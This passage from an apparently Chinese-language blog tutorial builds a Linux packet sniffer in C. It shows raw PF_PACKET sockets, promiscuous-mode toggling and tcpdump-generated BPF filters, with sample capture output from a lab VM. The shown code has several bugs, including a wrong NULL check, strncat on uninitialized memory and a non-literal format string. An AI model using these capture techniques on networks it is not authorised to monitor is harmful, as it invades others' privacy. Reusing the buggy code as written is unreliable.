class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock, n;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *iphead, *ethhead;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((sock=socket(PF_PACKET, SOCK_RAW,htons(ETH_P_IP)))&lt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 使用PF_PACKET协议族</span></span><br><span class="line"><span class="comment">        socket类型为SOCK_RAW</span></span><br><span class="line"><span class="comment">        使用ETH_P_IP来处理IP的一组协议 */</span></span><br><span class="line">        perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;----------\n&quot;</span>);</span><br><span class="line">        n = recvfrom(sock,buffer,<span class="number">2048</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>); <span class="comment">/* 接收数据报并存储源地址 */</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d bytes read\n&quot;</span>,n);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 检查数据包是否至少包含完整的MAC标头(14),IP标头(20)和TCP/UDP标头(8) */</span></span><br><span class="line">        <span class="keyword">if</span> (n&lt;<span class="number">42</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;recvfrom():&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Incomplete packet (errno is %d)\n&quot;</span>,errno);</span><br><span class="line">            close(sock);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ethhead = buffer;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Source MAC address: &quot;</span></span><br><span class="line">                <span class="string">&quot;%02x:%02x:%02x:%02x:%02x:%02x\n&quot;</span>,</span><br><span class="line">                ethhead[<span class="number">0</span>],ethhead[<span class="number">1</span>],ethhead[<span class="number">2</span>],</span><br><span class="line">                ethhead[<span class="number">3</span>],ethhead[<span class="number">4</span>],ethhead[<span class="number">5</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Destination MAC address: &quot;</span></span><br><span class="line">                <span class="string">&quot;%02x:%02x:%02x:%02x:%02x:%02x\n&quot;</span>,</span><br><span class="line">                ethhead[<span class="number">6</span>],ethhead[<span class="number">7</span>],ethhead[<span class="number">8</span>],</span><br><span class="line">                ethhead[<span class="number">9</span>],ethhead[<span class="number">10</span>],ethhead[<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line">        iphead = buffer+<span class="number">14</span>; <span class="comment">/* 跳过MAC头 */</span></span><br><span class="line">        <span class="keyword">if</span> (*iphead==<span class="number">0x45</span>) &#123; <span class="comment">/* 再次检查IPv4且不存在任何options */</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Source host %d.%d.%d.%d\n&quot;</span>,</span><br><span class="line">                    iphead[<span class="number">12</span>],iphead[<span class="number">13</span>],</span><br><span class="line">                    iphead[<span class="number">14</span>],iphead[<span class="number">15</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Dest host %d.%d.%d.%d\n&quot;</span>,</span><br><span class="line">                    iphead[<span class="number">16</span>],iphead[<span class="number">17</span>],</span><br><span class="line">                    iphead[<span class="number">18</span>],iphead[<span class="number">19</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Source,Dest ports %d,%d\n&quot;</span>,</span><br><span class="line">                    (iphead[<span class="number">20</span>]&lt;&lt;<span class="number">8</span>)+iphead[<span class="number">21</span>],</span><br><span class="line">                    (iphead[<span class="number">22</span>]&lt;&lt;<span class="number">8</span>)+iphead[<span class="number">23</span>]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Layer-4 protocol %d\n&quot;</span>,iphead[<span class="number">9</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 PF_PACKET 协议族嗅探所有发往自己主机的报文</li>
<li>通过简单的格式化输出 MAC 头与 IP 头的信息</li>
</ul>
<p>运行结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  Sniffer sudo ./test1  </span><br><span class="line">----------</span><br><span class="line"><span class="number">66</span> bytes read</span><br><span class="line">Source MAC address: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Destination MAC address: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Source host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Dest host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Source,Dest ports <span class="number">54530</span>,<span class="number">34372</span></span><br><span class="line">Layer<span class="number">-4</span> protocol <span class="number">6</span></span><br><span class="line">----------</span><br><span class="line"><span class="number">66</span> bytes read</span><br><span class="line">Source MAC address: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Destination MAC address: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Source host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Dest host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Source,Dest ports <span class="number">34372</span>,<span class="number">54530</span></span><br><span class="line">Layer<span class="number">-4</span> protocol <span class="number">6</span></span><br><span class="line">----------</span><br><span class="line"><span class="number">66</span> bytes read</span><br><span class="line">Source MAC address: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Destination MAC address: <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">Source host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Dest host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Source,Dest ports <span class="number">54530</span>,<span class="number">34372</span></span><br><span class="line">Layer<span class="number">-4</span> protocol <span class="number">6</span></span><br><span class="line">----------</span><br></pre></td></tr></table></figure>
<ul>
<li>本地进程通信的太网帧</li>
</ul>
<p><strong>Sniffer 案例二</strong></p>
<p>在上述案例中（非混杂模式），网卡丢弃所有不含有主机 MAC 地址的数据包，只有三个例外：</p>
<ul>
<li>如果一个帧的目的 MAC 地址是一个受限的广播地址 <code>255.255.255.255</code> 那么它将被所有的网卡接收</li>
<li>如果一个帧的目的地址是组播地址，那么它将被那些打开组播接收功能的网卡所接收</li>
<li>网卡如被设置成混杂模式，那么它将接收所有流经它的数据包 </li>
</ul>
<p>在 Linux 中可以使用如下代码 开启/关闭 混杂模式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig ens33 promisc</span><br><span class="line">sudo ifconfig ens33 -promisc</span><br></pre></td></tr></table></figure>
<ul>
<li>我的 VMware 上使用 ens33 虚拟网卡</li>
</ul>
<p>使用如下代码来查看目标网卡是否处于混杂模式：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/class/net/ens33/flags</span><br></pre></td></tr></table></figure>
<ul>
<li><code>0x1103</code>：开启</li>
<li><code>0x1003</code>：关闭</li>
</ul>
<p>在C语言中使用如下代码也可以开启混杂模式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ifreq</span> <span class="title">ethreq</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">strncpy</span>(ethreq.ifr_name,<span class="string">&quot;eth0&quot;</span>,IFNAMSIZ);</span><br><span class="line"><span class="keyword">if</span> (ioctl(sock,SIOCGIFFLAGS,&amp;ethreq) == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ethreq.ifr_flags|=IFF_PROMISC;</span><br><span class="line"><span class="keyword">if</span> (ioctl(sock,SIOCSIFFLAGS,&amp;ethreq) == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">    close(sock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Sniffer 案例三</strong></p>
<p>接下来要实现数据包的过滤，Linux 内核允许我们把一个名为 LPF 的过滤器直接放到 PF_PACKET 协议处理例程中（在网卡接收中断执行后立即执行）</p>
<ul>
<li>该过滤程序可以根据使用者的定义来运行</li>
<li>由一种名为 BPF（Berkely Packet Filter 伯克利数据包过滤器）的伪机器码写成的 </li>
</ul>
<p>使用 <code>tcpdump</code> 可以快速生成 BPF 代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  Sniffer sudo tcpdump -d host <span class="number">192.168</span><span class="number">.157</span><span class="number">.136</span> </span><br><span class="line">(<span class="number">000</span>) ldh      [<span class="number">12</span>]</span><br><span class="line">(<span class="number">001</span>) jeq      #<span class="number">0x800</span>           jt <span class="number">2</span>	jf <span class="number">6</span></span><br><span class="line">(<span class="number">002</span>) ld       [<span class="number">26</span>]</span><br><span class="line">(<span class="number">003</span>) jeq      #<span class="number">0xc0a89d88</span>      jt <span class="number">12</span>	jf <span class="number">4</span></span><br><span class="line">(<span class="number">004</span>) ld       [<span class="number">30</span>]</span><br><span class="line">(<span class="number">005</span>) jeq      #<span class="number">0xc0a89d88</span>      jt <span class="number">12</span>	jf <span class="number">13</span></span><br><span class="line">(<span class="number">006</span>) jeq      #<span class="number">0x806</span>           jt <span class="number">8</span>	jf <span class="number">7</span></span><br><span class="line">(<span class="number">007</span>) jeq      #<span class="number">0x8035</span>          jt <span class="number">8</span>	jf <span class="number">13</span></span><br><span class="line">(<span class="number">008</span>) ld       [<span class="number">28</span>]</span><br><span class="line">(<span class="number">009</span>) jeq      #<span class="number">0xc0a89d88</span>      jt <span class="number">12</span>	jf <span class="number">10</span></span><br><span class="line">(<span class="number">010</span>) ld       [<span class="number">38</span>]</span><br><span class="line">(<span class="number">011</span>) jeq      #<span class="number">0xc0a89d88</span>      jt <span class="number">12</span>	jf <span class="number">13</span></span><br><span class="line">(<span class="number">012</span>) ret      #<span class="number">262144</span></span><br><span class="line">(<span class="number">013</span>) ret      #<span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第 0-1,6-7 行：确定被抓到的帧是否在传输着 IP，ARP 或者 RARP 协议 </li>
<li>第 2-5,8-11 行：比较源地址或者目的地址是否与 <code>192.168.157.1</code> 相同  </li>
<li>将第12格的值与协议的特征值比较，如果比较失败，那么丢弃这个包</li>
</ul>
<p>在C语言中，建立一个 <code>sock_filter</code> 并为它绑定一个打开的端口，就可以使用该 BPF</p>
<p>使用 <code>tcpdump</code> 可以生成 BPF 对应的C代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜  Sniffer sudo tcpdump -dd host <span class="number">192.168</span><span class="number">.157</span><span class="number">.136</span>             </span><br><span class="line">&#123; <span class="number">0x28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000000c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0x00000800</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000001a</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000001e</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x00000806</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0x00008035</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000001c</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000026</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00040000</span> &#125;,</span><br><span class="line">&#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000000</span> &#125;,</span><br></pre></td></tr></table></figure>
<p>最后得到最终的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">➜  Sniffer sudo ./test2</span><br><span class="line">----------</span><br><span class="line"><span class="number">199</span> bytes read</span><br><span class="line">Source MAC address: <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:bf:<span class="number">5f</span>:<span class="number">3f</span></span><br><span class="line">Destination MAC address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:ef:<span class="number">45</span>:fa</span><br><span class="line">Source host <span class="number">192.168</span><span class="number">.157</span><span class="number">.2</span></span><br><span class="line">Dest host <span class="number">192.168</span><span class="number">.157</span><span class="number">.136</span></span><br><span class="line">Source,Dest ports <span class="number">53</span>,<span class="number">36313</span></span><br><span class="line">Layer<span class="number">-4</span> protocol <span class="number">17</span></span><br><span class="line">----------</span><br><span class="line"><span class="number">102</span> bytes read</span><br><span class="line">Source MAC address: <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:bf:<span class="number">5f</span>:<span class="number">3f</span></span><br><span class="line">Destination MAC address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:ef:<span class="number">45</span>:fa</span><br><span class="line">Source host <span class="number">192.168</span><span class="number">.157</span><span class="number">.2</span></span><br><span class="line">Dest host <span class="number">192.168</span><span class="number">.157</span><span class="number">.136</span></span><br><span class="line">Source,Dest ports <span class="number">53</span>,<span class="number">46817</span></span><br><span class="line">Layer<span class="number">-4</span> protocol <span class="number">17</span></span><br><span class="line">----------</span><br><span class="line"><span class="number">213</span> bytes read</span><br><span class="line">Source MAC address: <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:bf:<span class="number">5f</span>:<span class="number">3f</span></span><br><span class="line">Destination MAC address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:ef:<span class="number">45</span>:fa</span><br><span class="line">Source host <span class="number">192.168</span><span class="number">.157</span><span class="number">.2</span></span><br><span class="line">Dest host <span class="number">192.168</span><span class="number">.157</span><span class="number">.136</span></span><br><span class="line">Source,Dest ports <span class="number">53</span>,<span class="number">59949</span></span><br><span class="line">Layer<span class="number">-4</span> protocol <span class="number">17</span></span><br><span class="line">----------</span><br></pre></td></tr></table></figure>
<p><strong>Sniffer 代码</strong></p>
<p>下面给出我写的 Sniffer 代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/if_ether.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">backupInit</span><span class="params">(FILE **file)</span></span>&#123;</span><br><span class="line">	*file = fopen(<span class="string">&quot;log&quot;</span>,<span class="string">&quot;w+&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(file == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printLog</span><span class="params">(<span class="keyword">char</span> *str,FILE* file)</span></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stdout</span>,str);</span><br><span class="line">	<span class="built_in">fprintf</span>(file,str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getNowtime</span><span class="params">(FILE* file)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">char</span> str[<span class="number">60</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> YMD[<span class="number">15</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> HMS[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">time_t</span> current_time;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tm</span>* <span class="title">now_time</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *cur_time = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">21</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    time(&amp;current_time);</span><br><span class="line">    now_time = localtime(&amp;current_time);</span><br><span class="line"></span><br><span class="line">    strftime(YMD, <span class="keyword">sizeof</span>(YMD), <span class="string">&quot;%F &quot;</span>, now_time);</span><br><span class="line">    strftime(HMS, <span class="keyword">sizeof</span>(HMS), <span class="string">&quot;%T&quot;</span>, now_time);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">strncat</span>(cur_time, YMD, <span class="number">11</span>);</span><br><span class="line">    <span class="built_in">strncat</span>(cur_time, HMS, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(str,<span class="string">&quot;==========\nCurrent time: %s\n==========\n&quot;</span>, cur_time);</span><br><span class="line">	printLog(str,file);</span><br><span class="line">    <span class="built_in">free</span>(cur_time);</span><br><span class="line"></span><br><span class="line">    cur_time = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="keyword">size_t</span> num,<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (num &gt;&gt; (key*<span class="number">8</span>))&amp;<span class="number">0x000000ff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sock, n;</span><br><span class="line">	FILE* file;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">2048</span>];</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">512</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *ethhead;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iphead</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcphead</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">BPF_code</span>[]=</span> &#123;</span><br><span class="line">		&#123; <span class="number">0x28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000000c</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0x00000800</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x20</span>, 